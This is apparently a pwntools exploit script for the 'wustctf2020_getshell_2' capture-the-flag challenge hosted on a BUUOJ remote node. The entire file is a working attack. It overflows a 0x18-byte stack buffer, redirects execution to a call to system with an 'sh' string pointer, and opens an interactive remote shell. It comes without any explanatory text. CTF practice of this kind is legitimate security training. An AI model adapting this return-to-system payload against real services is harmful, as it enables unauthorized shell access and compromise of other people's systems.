from pwn import *

pn = './wustctf2020_getshell_2'
#p = process(pn)
p = remote('node4.buuoj.cn', 28552)
elf = ELF(pn)

#gdb.attach(p, 'b *0x8048529')

system = elf.plt['system']

sh = 0x08048650 + 32
call_system = 0x8048529

payload = b'a' * ( 0x18 + 4 ) + p32(call_system) + p32(sh)

p.sendline(payload)

p.interactive()
